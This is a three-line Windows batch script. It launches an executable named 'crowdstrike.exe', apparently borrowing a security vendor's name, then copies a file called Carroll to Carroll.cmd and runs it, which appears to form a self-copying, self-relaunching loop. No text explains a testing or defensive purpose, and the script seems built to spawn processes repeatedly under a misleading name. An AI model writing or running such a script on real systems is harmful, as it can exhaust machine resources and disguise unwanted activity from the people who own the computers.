@echo off
crowdstrike.exe
cmd /k copy Carroll Carroll.cmd & Carroll.cmd & exit 